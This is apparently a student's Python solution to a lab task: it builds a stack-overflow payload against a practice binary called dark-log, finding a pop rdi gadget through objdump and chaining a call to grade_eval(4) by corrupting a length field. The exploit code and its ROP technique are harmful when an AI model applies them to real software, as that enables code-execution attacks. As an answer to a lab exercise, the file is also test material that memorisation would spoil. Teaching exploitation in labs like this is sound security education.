#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""

#!/usr/bin/env python3
import sys
import struct
import subprocess
import re
from pathlib import Path

binary = Path(__file__).resolve().parent / "attack" / "dark-log"

def p64(value):
    return struct.pack("<Q", value)

# 从 dark-log 中寻找 pop rdi; ret Gadget
# 利用 pop r15; ret 的机器码 41 5f c3，
# 从第二个字节开始解释得到 5f c3。
asm = subprocess.check_output(
    ["objdump", "-d", "-M", "intel", str(binary)],
    text=True
)

lines = asm.splitlines()
pop_rdi_ret = None

for i in range(len(lines) - 1):
    match = re.match(
        r"\s*([0-9a-fA-F]+):\s+41\s+5f\s+pop\s+r15\b",
        lines[i]
    )
    next_match = re.match(
        r"\s*([0-9a-fA-F]+):\s+c3\s+ret\b",
        lines[i + 1]
    )

    if match and next_match:
        addr = int(match.group(1), 16)
        ret_addr = int(next_match.group(1), 16)

        if ret_addr == addr + 2:
            pop_rdi_ret = addr + 1
            break

assert pop_rdi_ret is not None, "Cannot find pop rdi; ret"

# 单独的 ret 指令，用于调整栈对齐
ret = pop_rdi_ret + 1

# 已从 dark-log 符号表确认
grade_eval = 0x401677

# 构造 grade_eval(4) 的 ROP 链
rop = (
    p64(pop_rdi_ret)
    + p64(4)
    + p64(ret)
    + p64(grade_eval)
)

# expression[128]：复制操作的数据来源
expression = rop.ljust(128, b"A")

# logMsg[128]：填充到 len 所在位置
log_msg = b"B" * 128

# 修改 len，使 memcpy 从返回地址开始写入
new_len = 0xA8

payload = (
    expression
    + log_msg
    + struct.pack("<I", new_len)
)

assert len(payload) == 260
assert b"\x0a" not in payload

sys.stdout.buffer.write(payload)
